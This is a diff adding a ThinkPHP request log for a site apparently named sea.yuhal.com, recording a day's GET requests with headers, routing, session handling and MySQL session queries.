+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'host' => 'sea.yuhal.com',
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004140s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_q0c2egavhlqa47bj2dhj6iodq7' AND session_expire > '1523760642' [ RunTime:0.002888s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T10:50:42+08:00 ] 172.16.252.49 106.11.227.120 GET /login.html
+[ log ] sea.yuhal.com/login.html [运行时间：0.005318s][吞吐率：188.04req/s] [内存消耗：479.09kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'login',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=q0c2egavhlqa47bj2dhj6iodq7',
+  'accept-encoding' => 'gzip',
+  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'host' => 'sea.yuhal.com',
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\sea\controller\Login->index[ /var/www/sea/application/sea/controller/Login.php ]
+[ info ] [ VIEW ] /var/www/sea/application/sea/view/page/login.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T11:37:33+08:00 ] 172.16.252.49 178.79.128.75 GET /
+[ log ] 118.31.23.98/ [运行时间：0.009798s][吞吐率：102.06req/s] [内存消耗：477.28kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003147s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_jcodmbao3et1vmtjlferd8d8q3' AND session_expire > '1523763453' [ RunTime:0.002270s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T11:37:34+08:00 ] 172.16.252.49 178.79.128.75 GET /
+[ log ] 118.31.23.98/ [运行时间：0.010365s][吞吐率：96.48req/s] [内存消耗：477.27kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003498s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_bvhtb491j7r0b8ajfe4fp983i3' AND session_expire > '1523763454' [ RunTime:0.002479s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T11:37:34+08:00 ] 172.16.252.49 178.79.128.75 GET /
+[ log ] 118.31.23.98/ [运行时间：0.009503s][吞吐率：105.23req/s] [内存消耗：477.27kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003201s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_boqps29s5ooi0ube51djqes925' AND session_expire > '1523763454' [ RunTime:0.002300s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T12:10:27+08:00 ] 172.16.252.49 59.120.193.93 GET /
+[ log ] 118.31.23.98/ [运行时间：0.010254s][吞吐率：97.52req/s] [内存消耗：477.28kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003330s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_pd3cgeur5f76b3j7hvmkk7iq53' AND session_expire > '1523765427' [ RunTime:0.002375s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T12:10:27+08:00 ] 172.16.252.49 59.120.193.93 GET /
+[ log ] 118.31.23.98/ [运行时间：0.009675s][吞吐率：103.36req/s] [内存消耗：477.27kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003126s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_er5p0s8r5spa744av47atv3tt2' AND session_expire > '1523765427' [ RunTime:0.002264s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T12:10:27+08:00 ] 172.16.252.49 59.120.193.93 GET /
+[ log ] 118.31.23.98/ [运行时间：0.009564s][吞吐率：104.56req/s] [内存消耗：477.27kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002702s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_e4rdflteja73huc4ktktfmlk02' AND session_expire > '1523765427' [ RunTime:0.001946s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T16:08:05+08:00 ] 172.16.252.49 179.215.193.111 GET /moo
+[ log ] 118.31.23.98/moo [运行时间：0.003844s][吞吐率：260.14req/s] [内存消耗：313.07kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'moo',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '118.31.23.98',
+  'user-agent' => 'Wget(linux)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T16:08:10+08:00 ] 172.16.252.49 179.215.193.111 GET /
+[ log ] 118.31.23.98/ [运行时间：0.008791s][吞吐率：113.75req/s] [内存消耗：476.94kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '118.31.23.98',
+  'user-agent' => 'Wget(linux)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002588s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_6ssk0li4avo7uipv1ilrvr4ng1' AND session_expire > '1523779690' [ RunTime:0.001888s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T16:59:31+08:00 ] 172.16.252.49 27.133.154.193 GET /
+[ log ] 118.31.23.98/ [运行时间：0.011017s][吞吐率：90.77req/s] [内存消耗：477.28kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003952s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_paehds4tt3n9e507apsrcdhsc3' AND session_expire > '1523782771' [ RunTime:0.002794s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T16:59:32+08:00 ] 172.16.252.49 27.133.154.193 GET /
+[ log ] 118.31.23.98/ [运行时间：0.008761s][吞吐率：114.14req/s] [内存消耗：477.27kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002790s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_63eej0gfuva9hmpdki010rt455' AND session_expire > '1523782772' [ RunTime:0.002010s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T16:59:32+08:00 ] 172.16.252.49 27.133.154.193 GET /
+[ log ] 118.31.23.98/ [运行时间：0.010801s][吞吐率：92.58req/s] [内存消耗：477.27kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003969s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_2o5adcag5l61np7m7hqd5j3kl4' AND session_expire > '1523782772' [ RunTime:0.002839s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T19:35:36+08:00 ] 172.16.252.49 47.92.2.133 GET /
+[ log ] 120.76.244.190:2049/ [运行时间：0.011579s][吞吐率：86.36req/s] [内存消耗：476.97kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'host' => '120.76.244.190:2049',
+  'connection' => 'Close',
+  'accept-encoding' => 'identity',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004045s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_fu31g6bptik01ia7c28ocllvi2' AND session_expire > '1523792136' [ RunTime:0.002839s ]
+
+---------------------------------------------------------------
